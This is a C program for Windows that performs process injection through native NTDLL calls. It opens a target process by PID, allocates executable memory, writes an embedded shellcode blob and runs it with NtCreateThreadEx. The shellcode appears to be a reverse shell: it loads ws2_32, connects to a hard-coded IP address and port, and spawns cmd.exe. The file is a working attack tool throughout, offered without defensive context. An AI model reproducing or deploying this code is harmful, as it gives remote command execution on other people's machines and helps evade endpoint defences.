#include <windows.h>
#include <stdio.h>

#define STATUS_SUCCESS ((NTSTATUS)0X0000000L)
#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)
#define error(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)

//FUNCTION PROTOTYPES
typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    struct _Unicode_String* ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService; 
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef NTSTATUS (NTAPI*NtOpenProcess) (
    _Out_ PHANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PCLIENT_ID ClientId
);

typedef struct _PS_ATTRIBUTE
{
    ULONG_PTR Attribute;
    SIZE_T Size;
    union
    {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

typedef NTSTATUS (NTAPI*NtCreateThreadEx) (
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ProcessHandle,
    _In_ PVOID StartRoutine,
    _In_opt_ PVOID Argument,
    _In_ ULONG CreateFlags,
    _In_ SIZE_T ZeroBits,
    _In_ SIZE_T StackSize,
    _In_ SIZE_T MaximumStackSize,
    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList
);

typedef NTSTATUS (NTAPI* NtClose) (
    _In_ HANDLE Handle
);

typedef NTSTATUS (NTAPI*NtAllocateVirtualMemory) (
    _In_ HANDLE ProcessHandle,
    _Inout_ _At_(*BaseAddress, _Readable_bytes_(*RegionSize) _Writable_bytes_(*RegionSize) _Post_readable_byte_size_(*RegionSize)) PVOID *BaseAddress,
    _In_ ULONG_PTR ZeroBits,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG AllocationType,
    _In_ ULONG Protect
);

typedef NTSTATUS (NTAPI*NtWriteVirtualMemory) (
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_reads_bytes_(BufferSize) PVOID Buffer,
    _In_ SIZE_T BufferSize,
    _Out_opt_ PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI* NtWaitForSingleObject)(
    _In_ HANDLE Handle,
    _In_ BOOLEAN Alertable,
    _In_opt_ PLARGE_INTEGER Timeout
);

HMODULE GetMod(IN LPCWSTR modname){
    HMODULE mod = GetModuleHandleW(modname);
    if(mod==NULL){
        error("could not get handle to module");
        return NULL;
    }
    else{
        okay("got handle to module ");
        return mod;
    }
}

int main(int argc, char* argv[]) {
    unsigned char shellcode[] = 
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"                                                     
    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"                                                     
    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"                                                     
    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"                                                     
    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"                                                     
    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"                                                     
    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"                                                     
    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"                                                     
    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"                                                     
    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"                                                     
    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"                                                     
    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
    "\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
    "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
    "\x00\x49\x89\xe5\x49\xbc\x02\x00\x33\x94\x03\x06\x1e\x55"
    "\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
    "\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
    "\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
    "\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
    "\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
    "\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
    "\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
    "\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
    "\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
    "\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
    "\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
    "\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
    "\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
    "\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
    "\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
    "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";


    
    NTSTATUS STATUS   =  0;
    DWORD    PID      =  0;
    PVOID    rBuffer  =  NULL;
    HMODULE  hNTDLL   =  NULL;
    HANDLE   hProcess =  NULL;
    HANDLE   hThread  =  NULL;
    SIZE_T   shellSz  =  sizeof(shellcode);
    SIZE_T   bytWrit  =  0;

    

    if(argc<2){
        error("usage error");
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    hNTDLL = GetMod(L"NTDLL");

    NtOpenProcess ntOpenProcess = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
    NtCreateThreadEx ntCreateThread = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
    NtAllocateVirtualMemory ntAllocMem = (NtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
    NtWriteVirtualMemory ntWriteMem = (NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
    NtClose ntClose = (NtClose)GetProcAddress(hNTDLL, "NtClose");
    NtWaitForSingleObject ntWaitFor = (NtWaitForSingleObject)GetProcAddress(hNTDLL, "NtWaitForSingleObject");
    info("got functions from NTDLL.dll");

    //Injection
    OBJECT_ATTRIBUTES OA = {sizeof(OA), NULL };
    CLIENT_ID CI = {(HANDLE)PID, NULL };
    STATUS = ntOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CI);
    if(STATUS!=STATUS_SUCCESS){
        error("could not get handle to process, error: 0x%lx", STATUS);
        return EXIT_FAILURE;
    }
    okay("got handle to process -> 0x%p", hProcess);

    STATUS = ntAllocMem(hProcess, &rBuffer, 0, &shellSz, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if(STATUS!=STATUS_SUCCESS){
        error("could not allocate memory, error: 0x%lx", STATUS);
        return EXIT_FAILURE;
    }
    okay("allocated memory in process -> %zu bytes (0x%p)", sizeof(shellcode), rBuffer);

    STATUS = ntWriteMem(hProcess, rBuffer, shellcode, sizeof(shellcode), &bytWrit);
    if(STATUS!=STATUS_SUCCESS){
        error("could not write memory, error: 0x%lx", STATUS);
        return EXIT_FAILURE;
    }
    okay("payload written in memory");
    
    STATUS = ntCreateThread(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rBuffer, NULL, 0, 0, 0, 0, NULL);
    if(STATUS!=STATUS_SUCCESS){
        error("could not start thread, error: 0x%lx", STATUS);
        return EXIT_FAILURE;
    }
    info("thread started...");

    STATUS = ntWaitFor(hThread, FALSE, NULL);
    okay("payload executed");

    STATUS = ntClose(hProcess);
    STATUS = ntClose(hThread);

    return EXIT_SUCCESS;
}
